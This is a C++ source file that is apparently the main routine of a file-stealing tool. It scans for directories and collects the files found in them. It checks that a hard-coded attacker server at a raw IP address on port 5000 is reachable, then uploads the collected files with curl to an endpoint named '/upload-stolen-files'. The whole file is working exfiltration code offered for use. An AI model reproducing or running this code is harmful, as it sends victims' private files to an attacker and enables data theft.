#include "../include/lib.h"
#include "get-directory.h"
#include "connection.h"
#include "copy-upload.h"
#include "curl.h"

int main() {
    fp::dir Dir = fp::dir();
    Dir.get_directory();
    if (!Dir.pVec.empty()) {
        for (size_t i=0; i < Dir.pVec.size(); ++i)
            std::cout << "File found at: " << Dir.pVec[i] << std::endl;
    }
    std::string atk_web_svr = "http://74.225.142.0:5000";
    std::string check_url = atk_web_svr;
    if (!cn::chk_svr_acc(check_url.append("/check-availability"))) {
        std::cout << atk_web_svr << std::endl;
        if(cn::sleep_await(check_url)) {
            std::cout << atk_web_svr << std::endl;
            return 1;
        };
    }

    std::vector<up::fldir> dirVec = {};
    for (int i=0; i<Dir.pVec.size(); ++i){
        up::fldir files = up::fldir(Dir.pVec[i]);
        files.find_files();
        dirVec.push_back(files);
    }

    atk_web_svr.append("/upload-stolen-files");
    std::cout << "Begin uploading files..." << std::endl;
    crlu::curl_upload(atk_web_svr, dirVec);

    for (int i=0; i<dirVec.size(); ++i){
        dirVec[i].~fldir();
    }
    Dir.~dir();
    return 0;
}